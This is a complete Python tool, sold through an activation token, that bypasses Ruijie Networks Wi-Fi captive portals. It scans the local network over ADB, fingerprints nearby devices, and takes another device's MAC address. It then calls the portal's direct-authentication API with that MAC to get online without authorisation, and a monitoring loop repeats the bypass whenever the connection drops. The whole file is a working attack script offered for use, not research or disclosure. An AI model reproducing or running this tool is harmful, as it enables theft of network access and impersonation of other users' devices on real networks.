import os
import re
import time
import socket
import json
import subprocess
import sys
import urllib3
import urllib.request
import requests
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Try to import Crypto for the activation system
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

# ==================== Disable warnings ====================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== COLOR CODES ====================
w = "\033[1;00m"
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
b = "\033[1;34m"
RESET = "\033[0m"
BOLD = "\033[1m"

# Map colors for consistency
CYAN = "\033[1;36m"
YELLOW = y
GREEN = g
RED = r
BLUE = b
WHITE = w

# ==================== ACTIVATION SYSTEM CONFIG ====================
SECRET_KEY = b"DoneBro100Secret" # Must be 16 bytes
TOKEN_FILE = "/sdcard/.ruijie_token" if os.path.exists("/sdcard") else ".ruijie_token"
ID_FILE = "/sdcard/.ruijie_id" if os.path.exists("/sdcard") else ".ruijie_id"

def get_device_id():
    # 1. Check if ID is already saved locally
    if os.path.exists(ID_FILE):
        try:
            with open(ID_FILE, "r") as f:
                saved_id = f.read().strip()
                if len(saved_id) == 8:
                    return saved_id
        except: pass

    # 2. If not saved, generate a new one
    new_id = ""
    try:
        android_id = subprocess.check_output("settings get secure android_id", shell=True, stderr=subprocess.DEVNULL).decode().strip()
        if android_id and android_id != "null":
            new_id = android_id[:8].upper()
    except: pass
    
    if not new_id:
        try:
            import uuid
            node_id = hex(uuid.getnode())[2:].zfill(8)
            new_id = node_id[:8].upper()
        except:
            new_id = "RB" + str(int(time.time()))[-6:]

    # 3. Save the generated ID so it never changes
    try:
        with open(ID_FILE, "w") as f:
            f.write(new_id)
    except: pass
    
    return new_id

def validate_token(token, device_id):
    if not HAS_CRYPTO:
        return True 
    
    try:
        cipher = AES.new(SECRET_KEY, AES.MODE_ECB)
        decoded = base64.b64decode(token)
        decrypted = unpad(cipher.decrypt(decoded), AES.block_size).decode()
        
        parts = decrypted.split("|")
        if len(parts) != 2: return False
        
        expiry_date_str = parts[0]
        token_device_id = parts[1]
        
        if token_device_id != device_id: return False
        
        expiry_date = datetime.strptime(expiry_date_str, "%Y%m%d")
        return expiry_date > datetime.now()
    except:
        return False

def check_activation():
    device_id = get_device_id()
    
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, "r") as f:
            token = f.read().strip()
            if validate_token(token, device_id):
                return True

    Logo()
    print(f"{r}      [!] ACTIVATION REQUIRED [!]{w}")
    Line()
    print(f"{w}      YOUR DEVICE ID: {g}{device_id}{w}")
    print(f"{w}      Status: {r}NOT ACTIVATED{w}")
    Line()
    print(f"{y}      Please contact @donebro100 to get your token.")
    print(f"{y}      Send your Device ID to the admin.")
    Line()
    
    token = input(f"{y}      Enter Activation Token: {w}").strip()
    
    if validate_token(token, device_id):
        with open(TOKEN_FILE, "w") as f:
            f.write(token)
        print(f"\n{g}      [+] Activation Successful!{w}")
        time.sleep(2)
        return True
    else:
        print(f"\n{r}      [-] Invalid Token or Expired!{w}")
        print(f"{r}      [-] Access Denied.{w}")
        sys.exit()

# ==================== UI HELPERS ====================
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def Line():
    try:
        print(f"{y}-\033[1;00m" * os.get_terminal_size().columns)
    except:
        print(f"{y}-{w}" * 40)

def Logo():
    clear()
    logo = f"""{b}
  ______   ________  ______   _______   __       __  __    __  __    __ 
 /      \\ /        |/      \\ /       \\ /  \\     /  |/  |  /  |/  |  /  |
/$$$$$$  |$$$$$$$$//$$$$$$  |$$$$$$$  |$$  \\   /$$ |$$ |  $$ |$$ |  $$ |
$$ \\__$$/    $$ |  $$ |__$$ |$$ |__$$ |$$$  \\ /$$$ |$$ |  $$ |$$  \\/$$/ 
$$      \\    $$ |  $$    $$ |$$    $$< $$$$  /$$$$ |$$ |  $$ | $$  $$<  
 $$$$$$  |   $$ |  $$$$$$$$ |$$$$$$$  |$$ $$ $$/$$ |$$ |  $$ |  $$$$  \\ 
/  \\__$$ |   $$ |  $$ |  $$ |$$ |  $$ |$$ |$$$/ $$ |$$ \\__$$ | $$ /$$  |
$$    $$/    $$ |  $$ |  $$ |$$ |  $$ |$$ | $/  $$ |$$    $$/ $$ |  $$ |
 $$$$$$/     $$/   $$/   $$/ $$/   $$/ $$/      $$/  $$$$$$/  $$/   $$/ {w}
"""
    print(logo)
    Line()
    print(f"{w}      [*] This tool is only for Ruijie Network Router")
    print(f"{w}      [*] Telegram: WTF")
    Line()

# ==================== OFFLINE VENDOR DATABASE ====================
OFFLINE_VENDORS = {
    "BC:D8:BB": "Apple", "D6:DD:D1": "Realme", "F8:AB:82": "Xiaomi/Poco", 
    "C2:37:76": "Redmi", "5C:D0:6E": "Xiaomi", "0A:13:EA": "Apple",
    "4A:9E:DC": "Apple", "7A:47:DF": "Apple", "5E:F2:91": "Apple",
    "C6:12:93": "Oppo", "DA:C3:AF": "Tecno", "7E:7F:F4": "Oppo",
    "22:B1:C6": "Samsung", "62:26:F1": "Apple", "DA:EB:DC": "Xiaomi",
    "D6:C5:AA": "Redmi", "6A:A9:C0": "Redmi", "EC:21:50": "Vivo",
    "FA:F9:95": "Oppo", "C8:1E:C2": "Itel", "62:DA:06": "Xiaomi",
    "4A:C1:6C": "Apple", "8E:F8:1D": "Infinix", "A6:0E:8B": "Oppo",
    "4A:55:45": "Poco", "C4:B2:5B": "Router/Gateway", "8E:35:3F": "Oppo",
    "5E:A0:1B": "Vivo", "7E:38:84": "Oppo", "82:99:5B": "Itel",
    "FA:57:54": "Apple", "C2:33:21": "Xiaomi", "DE:75:6A": "Unknown",
    "90:CB:A3": "Unknown", "96:E2:07": "Apple", "52:84:E2": "Tecno",
    "C4:AB:B2": "Vivo", "C2:0C:96": "Vivo", "F2:15:5A": "Redmi",
    "1E:30:57": "Vivo", "0A:09:7D": "Redmi", "CE:D5:2B": "Redmi",
    "3E:DF:A5": "Redmi", "12:CD:C6": "Redmi", "B6:A6:25": "Vivo",
    "72:33:28": "Redmi", "C6:59:19": "Xiaomi", "A2:04:DD": "Honor",
    "A2:CC:CD": "Oppo", "66:A2:61": "Unknown"
}

# ==================== AUTO DETECT HELPERS ====================
def check_adb():
    try:
        result = subprocess.run(["adb", "devices"], capture_output=True, text=True, timeout=5)
        if "device" in result.stdout and "List of devices attached" in result.stdout:
            lines = result.stdout.splitlines()
            for line in lines[1:]:
                if line.strip() and "device" in line and "offline" not in line:
                    return True
        return False
    except:
        return False

def get_my_gateway():
    try:
        output = subprocess.check_output("ip route", shell=True, stderr=subprocess.DEVNULL).decode('utf-8')
        match = re.search(r'default\s+via\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
        if match:
            return match.group(1)
    except: pass
    if check_adb():
        try:
            output = subprocess.check_output("adb shell ip route", shell=True, stderr=subprocess.DEVNULL).decode('utf-8')
            match = re.search(r'default\s+via\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
            if match:
                return match.group(1)
        except: pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        parts = ip.split('.')
        parts[-1] = '1'
        return '.'.join(parts)
    except:
        return "192.168.1.1"

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

# ==================== OPTION 1: ADB CONNECT ====================
def option_adb_connect():
    print(f"\n{BLUE}[*] ADB Connect Tool{RESET}")
    ip = input(f"{y}Enter Device IP to connect (e.g., 192.168.120.43): {RESET}").strip()
    if not ip:
        print(f"{r}[-] IP cannot be empty!{RESET}")
        input(f"{y}[!] Press Enter to go back...{RESET}")
        return
    try:
        print(f"{y}[*] Connecting to {ip}...{RESET}")
        result = subprocess.run(["adb", "connect", ip], capture_output=True, text=True, timeout=10)
        if "connected" in result.stdout.lower():
            print(f"{g}[+] Connected to {ip} successfully!{RESET}")
        else:
            print(f"{r}[-] Failed to connect: {result.stderr}{RESET}")
    except Exception as e:
        print(f"{r}[-] Error: {str(e)}{RESET}")
    input(f"\n{y}[!] Press Enter to go back...{RESET}")

# ==================== SCAN HELPERS ====================
def print_progress(current, total):
    percent = (current / total) * 100
    bar = "█" * int(percent / 5) + "-" * (20 - int(percent / 5))
    sys.stdout.write(f"\r{y}[*] Scanning: |{bar}| {percent:.1f}%{RESET}")
    sys.stdout.flush()

def get_hostname(ip):
    try:
        socket.setdefaulttimeout(0.2)
        return socket.gethostbyaddr(ip)[0]
    except: return None

def clean_hostname(name):
    if not name: return None
    name = re.sub(r'\.(lan|local|home|net|com|org)$', '', name, flags=re.IGNORECASE)
    name = name.replace('-', ' ').replace('_', ' ').title().strip()
    return name

def get_vendor_offline(mac):
    prefix = mac[:8].upper()
    if prefix in OFFLINE_VENDORS:
        return OFFLINE_VENDORS[prefix]
    try:
        url = f"https://api.maclookup.app/v2/macs/{mac.replace(':', '')[:6]}"
        with urllib.request.urlopen(url, timeout=1.0) as response:
            data = json.loads(response.read().decode())
            return data.get("company", "Unknown") if data.get("success") else "Unknown"
    except: return "Unknown"

def get_icon(name, vendor, details):
    name_low = (name or "").lower()
    vendor_low = (vendor or "").lower()
    details_low = (details or "").lower()
    
    if any(x in name_low or x in details_low for x in ["iphone", "ipad", "ios", "apple"]): return "📱"
    if any(x in name_low or x in details_low for x in ["redmi", "xiaomi", "oppo", "vivo", "samsung", "realme", "tecno", "infinix", "poco", "honor"]): return "📱"
    if any(x in name_low or x in details_low for x in ["windows", "macbook", "laptop", "pc", "desktop"]): return "💻"
    if any(x in details_low for x in ["router", "gateway", "http", "web"]): return "🌐"
    if "camera" in details_low: return "📷"
    return "❓"

def process_device(line):
    ip_match = re.search(r'^(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', line)
    mac_match = re.search(r'lladdr\s+([0-9a-fA-F:]{17})', line)
    
    if ip_match and mac_match:
        ip, mac = ip_match.group(1), mac_match.group(1)
        if ip.endswith(".1"): return None
        
        raw_host = get_hostname(ip)
        name = clean_hostname(raw_host)
        vendor = get_vendor_offline(mac)
        
        os_info = ""
        for port in [62078, 445, 80]:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.15)
                    if s.connect_ex((ip, port)) == 0:
                        if port == 62078: os_info = "iOS/Apple"
                        elif port == 445: os_info = "Windows"
                        elif port == 80: os_info = "Web"
                        break
            except: pass
            
        icon = get_icon(name, vendor, os_info)
        return {
            "ip": ip, "mac": mac, "name": name, "vendor": vendor,
            "os": os_info, "icon": icon
        }
    return None

def scan_macs(display_results=True):
    try:
        output = subprocess.check_output(["adb", "shell", "ip", "route"]).decode()
        subnet = re.search(r'src\s+(\d{1,3}\.\d{1,3}\.\d{1,3})', output).group(1)
    except: subnet = "192.168.1"
    
    if display_results: print(f"{y}[*] Network: {subnet}.0/24{RESET}")
    
    ips = [f"{subnet}.{i}" for i in range(1, 255)]
    with ThreadPoolExecutor(max_workers=100) as ex:
        for i, _ in enumerate(ex.map(lambda ip: subprocess.run(["adb", "shell", f"ping -c 1 -w 1 {ip}"], stdout=subprocess.DEVNULL), ips)):
            if i % 25 == 0 and display_results: 
                print_progress(i, 254)
    if display_results:
        print_progress(254, 254)
        print("\n" + f"{g}[+] Network Scan Complete!{RESET}")
    
    time.sleep(1)
    results = []
    try:
        output = subprocess.check_output(["adb", "shell", "ip", "neigh", "show"]).decode()
        lines = [l for l in output.split('\n') if any(s in l for s in ["REACHABLE", "STALE", "DELAY"])]
        
        if not lines:
            if display_results: print(f"{r}[-] No active devices found.{RESET}")
            return []

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(process_device, line) for line in lines]
            for i, f in enumerate(as_completed(futures)):
                res = f.result()
                if res: results.append(res)
                if display_results: print_progress(i+1, len(lines))
        
        results.sort(key=lambda x: list(map(int, x['ip'].split('.'))))
        
        if display_results:
            print("\n\n" + f"{w}{'IP Address':<15} | {'MAC Address':<17} | {'Device Info'}{RESET}")
            print(f"{w}-------------------------------------------------------------------{RESET}")
            for dev_res in results:
                name_display = dev_res['name'] or dev_res['vendor']
                if dev_res['os']: name_display += f" ({dev_res['os']})"
                print(f"{g}{dev_res['ip']:<15}{RESET} | {y}{dev_res['mac']:<17}{RESET} | {dev_res['icon']} {name_display}")
            print(f"\n{g}[+] Scan Complete! Found {len(results)} devices.{RESET}")
    except Exception as e:
        if display_results: print(f"{r}[-] Error: {str(e)}{RESET}")
    
    return results

# ==================== OPTION 2: AUTO BYPASS ====================
def get_portal_url():
    print(f"{y}[*] Trying to auto-capture portal URL...{RESET}")
    gateway = get_my_gateway()
    print(f"{BLUE}[*] Detected Gateway: {gateway}{RESET}")
    
    test_urls = [
        f"http://{gateway}", f"https://{gateway}",
        f"http://{gateway}:2060", f"https://{gateway}:2060",
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://www.google.com/generate_204",
        "http://captive.apple.com/hotspot-detect.html",
        "http://www.msftconnecttest.com/redirect",
    ]
    
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36', 'Accept': '*/*'})
    
    for url in test_urls:
        try:
            print(f"{BLUE}[*] Trying {url}...{RESET}")
            resp = session.get(url, timeout=5, allow_redirects=True, verify=False)
            final_url = resp.url
            if "portal-as.ruijienetworks.com" in final_url:
                print(f"{g}[+] Captured portal URL: {final_url}{RESET}")
                return final_url
            if "portal-as.ruijienetworks.com" in resp.text:
                match = re.search(r'href=["\'](https?://portal-as\.ruijienetworks\.com[^"\']+)["\']', resp.text, re.I)
                if match: return match.group(1)
        except: continue
    return None

def run_bypass_for_mac(portal_url, mac):
    try:
        if "/auth/wifidogAuth/login" in portal_url:
            api_url = portal_url.replace("/auth/wifidogAuth/login/?", "/api/auth/wifidog?stage=portal&")
            api_url = api_url.replace("/auth/wifidogAuth/login?", "/api/auth/wifidog?stage=portal&")
        else: api_url = portal_url
        
        new_url = replace_mac(api_url, mac)
        session = requests.Session()
        session.headers.update({"User-Agent": "Dalvik/2.1.0", "Connection": "Keep-Alive"})
        
        print(f"{y}[*] Getting session ID for MAC {mac}...{RESET}")
        resp1 = session.get(new_url, timeout=10, allow_redirects=True)
        if "sessionId=" not in resp1.url:
            match = re.search(r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)', resp1.text)
            if match: session_id = match.group(1)
            else: return False
        else:
            session_id = resp1.url.split("sessionId=")[1].split("&")[0]
        
        print(f"{g}[+] Session ID: {session_id}{RESET}")
        pwn_url = "https://portal-as.ruijienetworks.com/api/auth/direct/?lang=en_US"
        resp2 = session.post(pwn_url, json={"phoneNumber": "", "sessionId": session_id}, timeout=10)
        logon_url = resp2.json().get("result", {}).get("logonUrl", "")
        if not logon_url: return False

        if ":2060" in logon_url:
            final_url = re.sub(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", "10.44.77.240", logon_url)
            if session.get(final_url, timeout=10).status_code == 200: return True
        else:
            if session.get(logon_url, timeout=10).status_code == 200: return True
        return False
    except: return False

def monitor_connection(portal_url, mac):
    # Clear screen first to show only the status
    Logo()
    print(f"\n{g}      [+] BYPASS SUCCESSFUL! CONNECTED!{w}")
    Line()
    
    consecutive_failures = 0
    while True:
        try:
            param = '-n' if os.name == 'nt' else '-c'
            output = subprocess.check_output(['ping', param, '1', '-W', '1', '8.8.8.8'], stderr=subprocess.DEVNULL, universal_newlines=True)
            match = re.search(r"time[=<](\d+\.?\d*)", output)
            if match:
                ping_val = float(match.group(1))
                color = g if ping_val < 100 else (y if ping_val < 300 else r)
                sys.stdout.write(f"\r{BOLD}[{BLUE}📶 NETWORK{RESET}{BOLD}] {WHITE}Status: {g}ONLINE{RESET} | {WHITE}Ping: {color}{ping_val}ms{RESET}    ")
                sys.stdout.flush()
                consecutive_failures = 0
            else: raise Exception()
        except:
            sys.stdout.write(f"\r{BOLD}[{BLUE}📶 NETWORK{RESET}{BOLD}] {WHITE}Status: {r}OFFLINE{RESET} | {WHITE}Ping: {r}Timed Out{RESET}    ")
            sys.stdout.flush()
            consecutive_failures += 1
        
        if consecutive_failures >= 3:
            print(f"\n\n{r}[⚠️] Connection lost! Reconnecting...{RESET}")
            if run_bypass_for_mac(portal_url, mac):
                print(f"{g}[+] Reconnected successfully!{RESET}")
                consecutive_failures = 0
            else: time.sleep(5)
        time.sleep(1)

def option_auto_bypass():
    Logo()
    print(f"\n{BLUE}⚡  AUTO BYPASS (Scan + Ruijie Bypass)  ⚡{RESET}")
    Line()
    
    if not check_adb():
        print(f"{y}[!] ADB not connected. Please connect a device.{RESET}")
        ip = input(f"{y}Enter device IP to connect (or press Enter to skip): {RESET}").strip()
        if ip:
            try: subprocess.run(["adb", "connect", ip], check=True, timeout=10)
            except: return
        else: return

    devices = scan_macs(display_results=True)
    if not devices: return

    print(f"\n{y}Select a device to use for bypass:{RESET}")
    for idx, dev in enumerate(devices):
        print(f"{idx+1}. {dev['ip']} | {dev['mac']} | {dev['icon']} {dev['name'] or dev['vendor']}")
    
    choice = input(f"{y}Enter number (or press Enter for first device): {RESET}").strip()
    selected = devices[int(choice)-1] if choice.isdigit() and 1 <= int(choice) <= len(devices) else devices[0]
    mac = selected['mac']
    
    portal_url = get_portal_url() or input(f"{y}Enter portal URL manually: {RESET}").strip()
    if not portal_url: return

    if run_bypass_for_mac(portal_url, mac):
        monitor_connection(portal_url, mac)
    else:
        print(f"{r}[-] Bypass failed.{RESET}")
        input(f"\n{y}[!] Press Enter to go back...{RESET}")

# ==================== MAIN MENU ====================
def main_menu():
    Logo()
    print(f"1. ADB Connect")
    print(f"2. 🚀 Auto Bypass (Scan + Bypass)")
    print(f"3. Exit")
    Line()

if __name__ == "__main__":
    try: subprocess.run(["adb", "start-server"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except: pass
    
    # Check Activation First
    check_activation()

    while True:
        main_menu()
        choice = input(f"\n{y}Select Option (1, 2 or 3 to Exit): {RESET}").strip()
        if choice == '1': option_adb_connect()
        elif choice == '2': option_auto_bypass()
        elif choice == '3':
            print(f"\n{g}[+] Goodbye!{RESET}")
            break
        else: print(f"{r}[-] Invalid Option!{RESET}")
